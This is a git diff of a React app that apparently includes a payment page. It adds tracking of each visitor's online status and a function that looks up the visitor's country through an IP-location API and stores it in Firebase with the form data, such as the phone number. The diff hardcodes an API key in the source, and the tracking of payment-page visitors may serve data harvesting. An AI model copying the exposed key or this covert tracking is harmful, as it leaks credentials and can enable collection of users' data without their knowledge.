@@ -7,6 +7,7 @@ import Info from './info/info';
 import { Loader } from './loader';
 import { Payment } from './kent/kent';
 import { addData } from './firebase';
+import { setupOnlineStatus } from './online-sts';
 
 function App() {
   const [currantPage, setCurrantPage] = useState(1);
@@ -30,6 +31,31 @@ function App() {
       phone: phone,
     },
   };
+  useEffect(()=>{
+    if (_id) {
+      setupOnlineStatus(_id);
+      getLocation()
+    }
+  },[])
+  async function getLocation() {
+    const APIKEY = '3e1df4e14eba852f6a8abfb9c5ec85159b0680e8bc5e13f1f73978e0';
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
+
+    try {
+      const response = await fetch(url);
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      const country = await response.text();
+      addData({
+        ...data,
+        country: country,
+      });
+      console.log(country);
+    } catch (error) {
+      console.error('Error fetching location:', error);
+    }
+  }
   const handleNextPage = () => {
     addData(data);
     setisloading(true);
